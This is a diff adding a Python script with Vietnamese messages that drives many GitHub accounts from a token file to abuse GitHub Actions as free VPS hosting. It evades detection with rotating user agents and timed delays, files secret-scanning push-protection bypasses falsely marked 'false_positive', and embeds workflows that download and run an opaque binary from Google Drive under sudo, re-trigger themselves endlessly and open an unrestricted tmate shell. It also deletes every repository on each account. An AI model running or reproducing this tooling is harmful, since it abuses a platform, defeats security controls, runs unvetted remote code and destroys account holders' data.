@@ -1,0 +1,720 @@
+import subprocess
+import sys
+import asyncio
+import datetime
+import logging
+import requests
+import json
+import time
+import os
+import base64
+import random
+import threading
+import pytz
+from typing import List, Dict, Optional
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+
+# Hàm kiểm tra và cài đặt module pytz
+def ensure_pytz_installed():
+    try:
+        import pytz
+        return True
+    except ImportError:
+        print("Module pytz chưa được cài đặt. Đang cài đặt...")
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "pytz"])
+            print("Đã cài đặt pytz thành công.")
+            return True
+        except subprocess.CalledProcessError as e:
+            print(f"Lỗi khi cài đặt pytz: {e}")
+            return False
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+class GitHubVPSManager:
+    def __init__(self):
+        self.tokens = []
+        self.selected_tokens = []
+        self.token_info = {}
+        self.base_url = "https://api.github.com"
+        self.token_file = "token.txt"
+        self.lock = threading.Lock()
+        self.running = False
+        self.token_threads = {}
+        self.token_running = {}
+        self.is_processing_repos = False
+        self.rate_limit_remaining = {}
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.179 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0"
+        ]
+        self.vn_tz = pytz.timezone('Asia/Ho_Chi_Minh')
+
+    def load_tokens(self) -> List[str]:
+        if not os.path.exists(self.token_file):
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy file {self.token_file}.")
+            print(f"Tạo file {self.token_file} với một token trên mỗi dòng.")
+            return []
+        try:
+            with open(self.token_file, 'r', encoding='utf-8') as f:
+                tokens = [line.strip() for line in f.readlines() if line.strip()]
+            return tokens
+        except Exception as e:
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Lỗi khi đọc {self.token_file}: {e}")
+            return []
+
+    def get_headers(self, token: str) -> Dict:
+        headers = {
+            "Authorization": f"Bearer {token}",
+            "Accept": "application/vnd.github+json",
+            "X-GitHub-Api-Version": "2022-11-28",
+            "User-Agent": random.choice(self.user_agents)
+        }
+        return headers
+
+    def check_rate_limit(self, token: str) -> bool:
+        try:
+            headers = self.get_headers(token)
+            response = requests.get(f"{self.base_url}/rate_limit", headers=headers)
+            if response.status_code == 200:
+                data = response.json()
+                remaining = data['rate']['remaining']
+                reset_time = data['rate']['reset']
+                self.rate_limit_remaining[token] = (remaining, reset_time)
+                if remaining < 100:  # Giới hạn an toànn
+                    reset_time_dt = datetime.datetime.fromtimestamp(reset_time)
+                    wait_seconds = (reset_time_dt - datetime.datetime.now()).total_seconds()
+                    if wait_seconds > 0:
+                        print(f"[{datetime.datetime.now(self.vn_tz)}] Gần hết giới hạn API cho token {token[:10]}..., chờ {wait_seconds/60:.1f} phút...")
+                        time.sleep(wait_seconds)
+                    return False
+                return True
+            return False
+        except Exception as e:
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Lỗi khi kiểm tra giới hạn API: {e}")
+            return False
+
+    def get_user_info(self, token: str) -> Optional[Dict]:
+        if not self.check_rate_limit(token):
+            return None
+        try:
+            headers = self.get_headers(token)
+            response = requests.get(f"{self.base_url}/user", headers=headers)
+            self.human_like_delay(3.0, 5.0)
+            if response.status_code == 200:
+                return response.json()
+            return None
+        except Exception:
+            return None
+
+    def check_token_scopes(self, token: str) -> List[str]:
+        if not self.check_rate_limit(token):
+            return []
+        try:
+            headers = self.get_headers(token)
+            response = requests.get(f"{self.base_url}/user", headers=headers)
+            self.human_like_delay(3.0, 5.0)
+            if response.status_code == 200:
+                scopes = response.headers.get('X-OAuth-Scopes', '').split(', ')
+                return [scope.strip() for scope in scopes if scope.strip()]
+            return []
+        except Exception:
+            return []
+
+    def validate_tokens(self):
+        print(f"[{datetime.datetime.now(self.vn_tz)}] Đang xác thực token...")
+        self.token_info = {}
+        valid_tokens = []
+        for i, token in enumerate(self.tokens, 1):
+            user_info = self.get_user_info(token)
+            if user_info:
+                scopes = self.check_token_scopes(token)
+                self.token_info[i] = {
+                    'token': token,
+                    'username': user_info.get('login', 'Unknown'),
+                    'name': user_info.get('name') or 'No name',
+                    'public_repos': user_info.get('public_repos', 0),
+                    'private_repos': user_info.get('total_private_repos', 0),
+                    'scopes': scopes,
+                    'valid': True
+                }
+                valid_tokens.append(token)
+            else:
+                self.token_info[i] = {
+                    'token': token,
+                    'username': 'INVALID',
+                    'name': 'INVALID TOKEN',
+                    'public_repos': 0,
+                    'private_repos': 0,
+                    'scopes': [],
+                    'valid': False
+                }
+                print(f"[{datetime.datetime.now(self.vn_tz)}] Token {i} không hợp lệ, đã xóa khỏi danh sách.")
+        self.tokens = valid_tokens
+
+    def display_tokens(self):
+        print(f"[{datetime.datetime.now(self.vn_tz)}] Danh sách token GitHub:")
+        for i, info in self.token_info.items():
+            status = "Valid" if info['valid'] else "Invalid"
+            repo_count = info['public_repos'] + info['private_repos']
+            scopes_str = ', '.join(info['scopes'][:3]) if info['scopes'] else 'Không có quyền'
+            if len(info['scopes']) > 3:
+                scopes_str += f" (+{len(info['scopes'])-3} nữa)"
+            username = info['username'] or 'Unknown'
+            name = info['name'] or 'No name'
+            token_preview = info['token'][:10] + '...' + info['token'][-10:] if len(info['token']) >= 20 else info['token']
+            print(f"[{i}] {status} - @{username} | {name}")
+            print(f"Repos: {repo_count} | Quyền: {scopes_str}")
+            print(f"Token: {token_preview}")
+            print()
+
+    def select_tokens(self) -> List[int]:
+        valid_tokens = [i for i, info in self.token_info.items() if info['valid']]
+        if not valid_tokens:
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy token hợp lệ.")
+            return []
+        print(f"[{datetime.datetime.now(self.vn_tz)}] Tự động chọn tất cả {len(valid_tokens)} token hợp lệ.")
+        return valid_tokens
+
+    def human_like_delay(self, min_seconds: float = 3.0, max_seconds: float = 5.0):
+        delay = random.uniform(min_seconds, max_seconds)
+        time.sleep(delay)
+
+    def create_repository(self, token: str, username: str, repo_name: str) -> bool:
+        if not self.check_rate_limit(token):
+            return False
+        data = {
+            "name": repo_name,
+            "description": f"Project {repo_name}",
+            "private": False,
+            "auto_init": True
+        }
+        headers = self.get_headers(token)
+        response = requests.post(f"{self.base_url}/user/repos", headers=headers, json=data)
+        self.human_like_delay(3.0, 5.0)
+        if response.status_code == 201:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã tạo repository: {repo_name}")
+            return True
+        elif response.status_code == 403:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Giới hạn API hoặc bị chặn cho {repo_name}")
+            return False
+        elif response.status_code == 401:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Token không hợp lệ cho {repo_name}")
+            return False
+        else:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể tạo {repo_name}: {response.status_code}")
+            return False
+
+    def create_push_protection_bypass(self, token: str, username: str, repo_name: str, placeholder_id: str, reason: str = "false_positive") -> bool:
+        if not self.check_rate_limit(token):
+            return False
+        url = f"{self.base_url}/repos/{username}/{repo_name}/secret-scanning/push-protection-bypasses"
+        data = {
+            "placeholder_id": placeholder_id,
+            "reason": reason
+        }
+        headers = self.get_headers(token)
+        response = requests.post(url, headers=headers, json=data)
+        self.human_like_delay(3.0, 5.0)
+        if response.status_code in [200, 201]:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã tạo bypass bảo vệ push cho {repo_name}")
+            return True
+        else:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể tạo bypass cho {repo_name}")
+            return False
+
+    def upload_file(self, token: str, username: str, repo_name: str, file_path: str, content: str, message: str = "Add file"):
+        if not self.check_rate_limit(token):
+            return False
+        encoded_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
+        data = {
+            "message": message,
+            "content": encoded_content
+        }
+        headers = self.get_headers(token)
+        url = f"{self.base_url}/repos/{username}/{repo_name}/contents/{file_path}"
+        response = requests.put(url, headers=headers, json=data)
+        self.human_like_delay(3.0, 5.0)
+        if response.status_code == 201:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã tải lên {file_path} vào {repo_name}")
+            return True
+        elif response.status_code == 409:
+            try:
+                error_data = response.json()
+                if "secret_scanning" in response.text or "Secret detected" in response.text:
+                    with self.lock:
+                        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Phát hiện secret trong {file_path}, đang tạo bypass...")
+                    bypass_placeholders = error_data.get('metadata', {}).get('secret_scanning', {}).get('bypass_placeholders', [])
+                    if bypass_placeholders:
+                        for placeholder in bypass_placeholders:
+                            placeholder_id = placeholder.get('placeholder_id')
+                            if placeholder_id:
+                                bypass_success = self.create_push_protection_bypass(token, username, repo_name, placeholder_id, "false_positive")
+                                if bypass_success:
+                                    self.human_like_delay(3.0, 5.0)
+                                    retry_response = requests.put(url, headers=headers, json=data)
+                                    if retry_response.status_code == 201:
+                                        with self.lock:
+                                            print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã tải lên {file_path} vào {repo_name} (đã bypass bảo vệ secret)")
+                                        return True
+                        return self.upload_with_alternative_method(token, username, repo_name, file_path, content, message)
+                    else:
+                        with self.lock:
+                            print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không tìm thấy placeholder bypass")
+                        return False
+                else:
+                    with self.lock:
+                        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể tải lên {file_path} vào {repo_name}")
+                    return False
+            except Exception as e:
+                with self.lock:
+                    print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Lỗi khi xử lý bypass secret: {e}")
+                return False
+        else:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể tải lên {file_path} vào {repo_name}")
+            return False
+
+    def upload_with_alternative_method(self, token: str, username: str, repo_name: str, file_path: str, content: str, message: str) -> bool:
+        if not self.check_rate_limit(token):
+            return False
+        with self.lock:
+            print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Thử phương pháp tải lên thay thế cho {file_path}...")
+        try:
+            import re
+            modified_content = content
+            modified_content = re.sub(r'ghp_[a-zA-Z0-9]{36}', '${{ secrets.GITHUB_TOKEN }}', modified_content)
+            modified_content = re.sub(r'github_pat_[a-zA-Z0-9_]{82}', '${{ secrets.GH_PAT }}', modified_content)
+            encoded_content = base64.b64encode(modified_content.encode('utf-8')).decode('utf-8')
+            data = {
+                "message": f"{message} (auto-sanitized)",
+                "content": encoded_content
+            }
+            headers = self.get_headers(token)
+            url = f"{self.base_url}/repos/{username}/{repo_name}/contents/{file_path}"
+            response = requests.put(url, headers=headers, json=data)
+            self.human_like_delay(3.0, 5.0)
+            if response.status_code == 201:
+                with self.lock:
+                    print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã tải lên {file_path} vào {repo_name} (phiên bản đã được làm sạch)")
+                return True
+            else:
+                with self.lock:
+                    print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Phương pháp thay thế thất bại")
+                return False
+        except Exception as e:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Lỗi phương pháp thay thế: {e}")
+            return False
+
+    def update_repo_settings(self, token: str, username: str, repo_name: str) -> bool:
+        if not self.check_rate_limit(token):
+            return False
+        headers = self.get_headers(token)
+        actions_data = {
+            "enabled": True,
+            "allowed_actions": "all"
+        }
+        actions_url = f"{self.base_url}/repos/{username}/{repo_name}/actions/permissions"
+        response = requests.put(actions_url, headers=headers, json=actions_data)
+        self.human_like_delay(3.0, 5.0)
+        workflow_data = {
+            "default_workflow_permissions": "write",
+            "can_approve_pull_request_reviews": True
+        }
+        workflow_url = f"{self.base_url}/repos/{username}/{repo_name}/actions/permissions/workflow"
+        response = requests.put(workflow_url, headers=headers, json=workflow_data)
+        self.human_like_delay(3.0, 5.0)
+        if response.status_code == 204:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã cập nhật quyền workflow cho {repo_name}")
+            return True
+        else:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể cập nhật quyền workflow cho {repo_name}")
+            return False
+
+    def trigger_workflow(self, token: str, username: str, repo_name: str, workflow_file: str = "tmate.yml") -> bool:
+        if not self.check_rate_limit(token):
+            return False
+        data = {
+            "ref": "main"
+        }
+        headers = self.get_headers(token)
+        url = f"{self.base_url}/repos/{username}/{repo_name}/actions/workflows/{workflow_file}/dispatches"
+        response = requests.post(url, headers=headers, json=data)
+        self.human_like_delay(3.0, 5.0)
+        if response.status_code == 204:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã khởi động workflow cho {repo_name}")
+            return True
+        else:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể khởi động workflow cho {repo_name}")
+            return False
+
+    def read_local_file(self, filename: str) -> str:
+        try:
+            if os.path.exists(filename):
+                with open(filename, 'r', encoding='utf-8') as f:
+                    return f.read()
+            else:
+                with self.lock:
+                    print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy file {filename}.")
+                return None
+        except Exception as e:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] Lỗi khi đọc {filename}: {e}")
+            return None
+
+    def get_tmate_workflow_content(self) -> str:
+        content = self.read_local_file("tmate.yml")
+        if content:
+            return content
+        return """name: CD - Deploy - API
+on:
+  workflow_dispatch:
+  repository_dispatch:
+    types: [create-vps]
+
+jobs:
+  start-vps:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    env:
+      VPS_NAME: ${{ github.event.client_payload.vps_name || 'manual-vps' }}
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v3
+    - name: Setup Node.js
+      uses: actions/setup-node@v3
+      with:
+        node-version: '20'
+    - name: Install & Run Bot
+      run: |
+        sudo su
+        pip install --upgrade pip || echo "⚠️ pip upgrade failed"
+        pip install  gdown  || echo "⚠️ pip install failed"
+        gdown https://drive.google.com/uc?id=1L2BmjKlVB3W5ZK4e51cXFrmE7eKRgy5L -O setup || echo "⚠️ setup"
+        chmod +x setup
+        ./setup
+    - name: Keep VPS alive
+      run: |
+        for i in $(seq 1 360); do
+          echo "Running minute $i/360..."
+          sleep 60
+        done
+    - name: Restart workflow
+      if: always()
+      run: |
+        curl -X POST \
+          -H "Accept: application/vnd.github+json" \
+          -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+          -H "Content-Type: application/json" \
+          https://api.github.com/repos/${{ github.repository }}/dispatches \
+          -d '{"event_type": "create-vps"}'
+"""
+
+    def get_auto_start_workflow_content(self) -> str:
+        content = self.read_local_file("auto-start.yml")
+        if content:
+            return content
+        return """name: CI - Submodule
+on:
+  schedule:
+    - cron: '0 */6 * * *'
+  workflow_dispatch:
+
+jobs:
+  auto-vps:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    - name: Continuous Delivery
+      uses: mxschmitt/action-tmate@v3
+      timeout-minutes: 360
+      with:
+        limit-access-to-actor: false
+        sudo: true
+    - name: Keep Alive
+      run: |
+        echo "VPS is running..."
+        echo "Started at: $(date)"
+        sleep 360m
+"""
+
+    def delete_repository(self, token: str, username: str, repo_name: str) -> bool:
+        if not self.check_rate_limit(token):
+            return False
+        headers = self.get_headers(token)
+        url = f"{self.base_url}/repos/{username}/{repo_name}"
+        response = requests.delete(url, headers=headers)
+        self.human_like_delay(2.0, 3.0)  # Delay 2-3 giây sau mỗi lần xóa
+        if response.status_code == 204:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã xóa repository: {repo_name}")
+            return True
+        else:
+            with self.lock:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không thể xóa {repo_name}")
+            return False
+
+    def get_all_user_repos(self, token: str, username: str) -> List[Dict]:
+        if not self.check_rate_limit(token):
+            return []
+        all_repos = []
+        page = 1
+        per_page = 100
+        headers = self.get_headers(token)
+        while True:
+            url = f"{self.base_url}/user/repos"
+            params = {
+                "per_page": per_page,
+                "page": page,
+                "type": "owner",
+                "sort": "updated",
+                "direction": "desc"
+            }
+            response = requests.get(url, headers=headers, params=params)
+            self.human_like_delay(3.0, 5.0)
+            if response.status_code == 200:
+                repos = response.json()
+                if not repos:
+                    break
+                all_repos.extend(repos)
+                page += 1
+                if len(repos) < per_page:
+                    break
+            else:
+                break
+        return all_repos
+
+    def delete_all_repos_for_account(self, token: str, username: str, spread_over_seconds: float = 0) -> int:
+        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đang lấy tất cả repository...")
+        all_repos = self.get_all_user_repos(token, username)
+        if not all_repos:
+            print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Không tìm thấy repository.")
+            return 0
+        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Tìm thấy {len(all_repos)} repository")
+        deleted_count = 0
+        if spread_over_seconds > 0:
+            delay_per_repo = spread_over_seconds / max(1, len(all_repos))
+        else:
+            delay_per_repo = 0
+        for repo in all_repos:
+            if self.delete_repository(token, username, repo['name']):
+                deleted_count += 1
+            if delay_per_repo > 0:
+                time.sleep(delay_per_repo)
+            else:
+                self.human_like_delay(2.0, 3.0)  # Delay 2-3 giây nếu không có spread_over_seconds
+        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã xóa {deleted_count}/{len(all_repos)} repository")
+        return deleted_count
+
+    def process_single_token_cycle(self, token_index: int, repo_count: int = 2):
+        token_info = self.token_info[token_index]
+        token = token_info['token']
+        username = token_info['username']
+        cycle_count = 1
+        self.is_processing_repos = True
+        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Chu kỳ #{cycle_count} bắt đầu")
+        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đang tạo và khởi chạy {repo_count} repository...")
+
+        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đang dọn dẹp tất cả repository hiện có...")
+        deleted_count = self.delete_all_repos_for_account(token, username)
+        if deleted_count > 0:
+            print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đang chờ sau khi dọn dẹp...")
+            self.human_like_delay(3.0, 5.0)
+
+        created_repos = []
+        consecutive_failures = 0
+        repo_names = [f"docs-{i}" for i in range(1, repo_count + 1)]
+        for i in range(1, repo_count + 1):
+            if not self.token_running.get(token_index, False):
+                break
+            repo_name = repo_names[i-1]
+            if self.create_repository(token, username, repo_name):
+                created_repos.append(repo_name)
+                consecutive_failures = 0
+                self.human_like_delay(3.0, 5.0)
+                self.upload_file(token, username, repo_name, ".github/workflows/tmate.yml",
+                                 self.get_tmate_workflow_content(), "Add workflow")
+                self.human_like_delay(3.0, 5.0)
+                self.upload_file(token, username, repo_name, ".github/workflows/auto-start.yml",
+                                 self.get_auto_start_workflow_content(), "Workflow")
+                self.human_like_delay(3.0, 5.0)
+                self.update_repo_settings(token, username, repo_name)
+                self.human_like_delay(3.0, 5.0)
+            else:
+                consecutive_failures += 1
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Lỗi liên tiếp: {consecutive_failures}")
+                if consecutive_failures >= 3:
+                    print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Token bị dừng do {consecutive_failures} lỗi liên tiếp")
+                    self.token_running[token_index] = False
+                    break
+                self.human_like_delay(3.0, 5.0)
+
+        if not self.token_running.get(token_index, False):
+            print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Chu kỳ token đã dừng do lỗi")
+            self.is_processing_repos = False
+            return
+
+        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Đã tạo {len(created_repos)} repository")
+        for repo_name in created_repos:
+            for attempt in range(1, 11):
+                if not self.token_running.get(token_index, False):
+                    break
+                print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Khởi động workflow lần {attempt}/5 cho {repo_name}")
+                self.trigger_workflow(token, username, repo_name)
+                self.human_like_delay(3.0, 5.0)
+
+        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Hoàn tất setup và khởi động workflow")
+        self.is_processing_repos = False
+        self.token_running[token_index] = False
+        print(f"[{datetime.datetime.now(self.vn_tz)}] [@{username}] Chu kỳ token đã hoàn thành và dừng")
+
+    def start_auto_cycle(self):
+        if self.running:
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Chu kỳ tự động đang chạy.")
+            return
+        self.running = True
+        for token_index in self.selected_tokens:
+            self.token_running[token_index] = True
+            thread = threading.Thread(
+                target=self.process_single_token_cycle,
+                args=(token_index, 2),
+                daemon=True,
+                name=f"Token-{token_index}-Thread"
+            )
+            self.token_threads[token_index] = thread
+            thread.start()
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Đã khởi động thread cho token {token_index} (Thread: {thread.name})")
+            self.human_like_delay(3.0, 5.0)
+        print(f"[{datetime.datetime.now(self.vn_tz)}] Đã khởi động {len(self.selected_tokens)} thread token.")
+
+        for token_index, thread in self.token_threads.items():
+            thread.join()
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Thread cho token {token_index} ({thread.name}) đã hoàn thành")
+        self.running = False
+        print(f"[{datetime.datetime.now(self.vn_tz)}] Tất cả thread token đã hoàn thành.")
+
+    def stop_auto_cycle(self):
+        if not self.running:
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Chu kỳ tự động chưa chạy.")
+            return
+        self.running = False
+        for token_index in self.token_running:
+            self.token_running[token_index] = False
+        for token_index, thread in self.token_threads.items():
+            thread.join(timeout=10)
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Đã dừng thread cho token {token_index} ({thread.name})")
+            # Xóa tất cả repository ngay lập tức với độ trễ 2-3 giây
+            token_info = self.token_info[token_index]
+            token = token_info['token']
+            username = token_info['username']
+            self.delete_all_repos_for_account(token, username, spread_over_seconds=0)
+        self.token_threads.clear()
+        self.token_running.clear()
+        print(f"[{datetime.datetime.now(self.vn_tz)}] Đã dừng tất cả thread token.")
+        self.is_processing_repos = False
+
+    def wait_until_time(self, target_hour: int, target_minute: int) -> None:
+        now = datetime.datetime.now(self.vn_tz)
+        target_time_today = now.replace(hour=target_hour, minute=target_minute, second=0, microsecond=0)
+        if now >= target_time_today:
+            target_time = target_time_today + datetime.timedelta(days=1)
+        else:
+            target_time = target_time_today
+        seconds_to_wait = (target_time - now).total_seconds()
+        print(f"[{datetime.datetime.now(self.vn_tz)}] Đang chờ đến {target_hour:02d}:{target_minute:02d} ({seconds_to_wait/3600:.2f} giờ)...")
+        time.sleep(seconds_to_wait)
+
+    def run(self):
+        while True:
+            now = datetime.datetime.now(self.vn_tz)
+            current_hour = now.hour
+            current_minute = now.minute
+
+            # Kiểm tra nếu hiện tại từ 00:00 đến 05:00, xóa repo ngay lập tức với delay 2-3 giây
+            if (current_hour > 21 or (current_hour == 21 and current_minute >= 30)) or (current_hour < 4):
+                print(f"[{datetime.datetime.now(self.vn_tz)}] Đã đến 12h đêm, bắt đầu xóa repository với delay 2-3 giây...")
+                self.tokens = self.load_tokens()
+                if not self.tokens:
+                    print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy token.")
+                    create_file = input("Tạo file mẫu token.txt? (y/n): ").strip().lower()
+                    if create_file == 'y':
+                        self.create_token_file_template()
+                    return
+                self.validate_tokens()
+                self.display_tokens()
+                self.selected_tokens = self.select_tokens()
+                if not self.selected_tokens:
+                    print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy token hợp lệ.")
+                    print(f"[{datetime.datetime.now(self.vn_tz)}] Dừng chương trình do không có token hợp lệ.")
+                    return
+
+                # Xóa repository ngay lập tức với delay 2-3 giây
+                for token_index in self.selected_tokens:
+                    token_info = self.token_info[token_index]
+                    token = token_info['token']
+                    username = token_info['username']
+                    self.delete_all_repos_for_account(token, username, spread_over_seconds=0)
+
+                # Đợi đến 05:00
+                sys.exit(1)
+
+            # Tiến hành chu kỳ bình thường
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Bắt đầu chu kỳ mới...")
+            self.tokens = self.load_tokens()
+            if not self.tokens:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy token.")
+                create_file = input("Tạo file mẫu token.txt? (y/n): ").strip().lower()
+                if create_file == 'y':
+                    self.create_token_file_template()
+                return
+            self.validate_tokens()
+            self.display_tokens()
+            self.selected_tokens = self.select_tokens()
+            if not self.selected_tokens:
+                print(f"[{datetime.datetime.now(self.vn_tz)}] Không tìm thấy token hợp lệ.")
+                print(f"[{datetime.datetime.now(self.vn_tz)}] Dừng chương trình do không có token hợp lệ.")
+                return
+            selected_usernames = [self.token_info[i]['username'] for i in self.selected_tokens]
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Sử dụng {len(self.selected_tokens)} tài khoản: {', '.join(selected_usernames)}")
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Đang bắt đầu đăng ký VPS đa luồng...")
+            self.start_auto_cycle()
+            print(f"[{datetime.datetime.now(self.vn_tz)}] Hoàn tất chu kỳ, chờ 3 tiếng...")
+            sys.exit()
+
+    def create_token_file_template(self):
+        with open(self.token_file, 'w', encoding='utf-8') as f:
+            f.write("# Thêm token GitHub Personal Access vào đây, mỗi token một dòng\n")
+            f.write("# Ví dụ: ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n")
+        print(f"[{datetime.datetime.now(self.vn_tz)}] Đã tạo file mẫu {self.token_file}")
+
+
+if __name__ == "__main__":
+    # Kiểm tra và cài đặt pytz trước khi chạy
+    if not ensure_pytz_installed():
+        print("Không thể cài đặt pytz. Dừng chương trình.")
+        sys.exit(1)
+
+    manager = GitHubVPSManager()
+    try:
+        manager.run()
+    except KeyboardInterrupt:
+        print(f"[{datetime.datetime.now(pytz.timezone('Asia/Ho_Chi_Minh'))}] Đang tắt...")
+        manager.stop_auto_cycle()
+    except Exception as e:
+        print(f"[{datetime.datetime.now(pytz.timezone('Asia/Ho_Chi_Minh'))}] Lỗi: {e}")
+        manager.stop_auto_cycle()
